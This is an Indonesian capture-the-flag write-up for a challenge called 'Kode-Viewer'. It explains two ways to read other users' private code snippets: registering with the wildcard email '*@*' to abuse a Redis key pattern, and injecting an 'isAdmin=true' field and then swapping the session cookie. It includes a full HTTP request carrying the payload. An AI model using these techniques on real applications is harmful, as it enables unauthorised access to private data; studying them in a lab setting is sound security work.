# Kode-Viewer

Solution by: HCS-GaadaHandleCrypto

## Problems
Diberikan sebuah website dengan fungsionalitas untuk membuat kode. Pengguna bisa menentukan apakah kode tersebut bisa dilihat oleh user lain atau tidak.

<img width="547" alt="image" src="https://github.com/user-attachments/assets/3c96b884-d3fc-4954-bb88-23d3ab723b1f">

Ketika mengunjungi url http://[ip]/kode, maka website akan memunculkan kode milik user tersebut.

User juga bisa melihat kode milik user lain yang bersifat public dengan menggunakan fitur search. 

## Goal
Pada soal ini, kita diharuskan untuk bisa membaca kode private milik user lain yang menyimpan informasi rahasia atau dalam kasus ini adalah flag yang kita cari.

## Solution
Untuk bisa membaca kode privat dari user lain, ada beberapa solusi yang bisa digunakan. Berikut adalah solusinya

### Mendaftar menggunakan email dengan format **\*@\***

```ts
async register(payload: AuthDTO) {

    const userExists = await this.kv.get(payload.email);
    if (userExists) {
      return { message: 'User already exists' };
    }

    const hashedPassword = await bcrypt.hash(payload.password, 10);
    const data = { email: payload.email, hashedPassword, isAdmin: false };
    await this.kv.set(payload.email, data, 0);
    return { message: 'User registered' };
  }

  async logout(sessionId: string) {
    await this.kv.del(sessionId);
    return { message: 'Logged out' };
  }

  async getUser(sessionId: string) {
    return this.kv.get(sessionId);
  }
```

Pada snippet kode registrasi di atas, bisa dilihat bahwa tidak ada validasi pada format email yang didaftar, sehingga kita bisa mendaftar dengan format apapun. Tidak adanya validasi format email menyebakan pengambilan data kode. Berikut adalah snippet kode yang berfungsi untuk mengambil kode dari redis:

```ts
  async list(user: Session) {
    const kodes = user.isAdmin
      ? await this.kv.find('kode-*')
      : await this.kv.find(`kode-${user.email}-*`);
    return this.parse(kodes);
  }
```

Kode yang tersimpan pada redis memiliki format sebagai berikut:

```txt
kode-[email]-[nama_kode]-[lang]-[type]
```

Dengan menggunakan format email **\*@\***, proses pengambilan data akan menjadi seperti berikut:

```txt
kode-*@*-*
```

Sehingga backend akan mengambil kode milik semua user dengan privasi apapun.

### Membuat note dengan tambahan informasi isAdmin

Pada snippet pembuatan kode baru di bawah ini, penyimpanan kode dilakukan dengan cara berikut:

```ts
  async create(email: string, payload: KodeDTO) {
    payload.kind = payload.kind ? 'private' : 'public';
    const key = `kode-${email}-${payload.name}-${payload.lang}-${payload.kind}`;
    return this.kv.set(key, { email, ...payload }, 1200);
  }
```

Sehingga pada redis informasi dari kode akan tersimpan sebagai berikut:

```json
{
    "kode-email-name-lang-kind":"{\"email\":\"email user\",\"kode\":\"isi kode\",\"lang\":\"bahasa program\",\"name\":\"nama kode\",\"kind\":\"tipe privasi\"}"
}
```

Karena tidak ada limitasi informasi yang dapat dikirimkan pada kode, kita bisa menambahkan informasi tambahan `isAdmin=true` pada proses penambahan kode. Berikut informasi yang sekiranya dikirimkan ke backend:

```txt
kode=somecode&lang=python&name=yayaya&isAdmin=true
```

Selanjutnya informasi yang tersimpan pada redis adalah sebagai berikut:

```json
{
    "kode-email-name-lang-kind":"{\"email\":\"email user\",\"kode\":\"isi kode\",\"lang\":\"bahasa program\",\"name\":\"nama kode\",\"kind\":\"tipe privasi\",\"isAdmin\":\"true\"}"
}
```

Karena kode yang tersimpan memiliki informasi `isAdmin=true`, tinggal ubah session yang dimiliki sekarang dan kunjungi endpoint `/kode`. Maka kita dapat melihat semua kode user lain dengan privasi apapun. Hal ini bisa dilihat pada proses pengambilan informasi dibawah:

```ts
  async list(user: Session) {
    const kodes = user.isAdmin
      ? await this.kv.find('kode-*')
      : await this.kv.find(`kode-${user.email}-*`);
    return this.parse(kodes);
  }
```

Berikut adalah step by step untuk membaca semua kode user dengan privasi apapun:

- Buat kode baru dengan tambahan informasi `isAdmin=true`
```txt
POST /kode HTTP/1.1
Host: localhost:10000
Content-Length: 56
Cache-Control: max-age=0
sec-ch-ua: "Not;A=Brand";v="24", "Chromium";v="128"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
Origin: http://localhost:10000
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost:10000/kode/create
Accept-Encoding: gzip, deflate, br
Cookie: session=77c903e3-9e94-4c17-ae95-9ed2c2c337ec
Connection: keep-alive

kode=JanganLupaFollowIGHCS&lang=python&name=payload_note&isAdmin=true
```

- Ubah session dengan nama dari note yang barusan dibuat:
<img width="361" alt="image" src="https://github.com/user-attachments/assets/02bf87d2-aadc-4ccd-872c-123e3ea09aae">

- Visit `/kode` dan semua kode akan terlihat
<img width="959" alt="image" src="https://github.com/user-attachments/assets/8108f772-b440-4887-95c9-48435ce1ebe1">

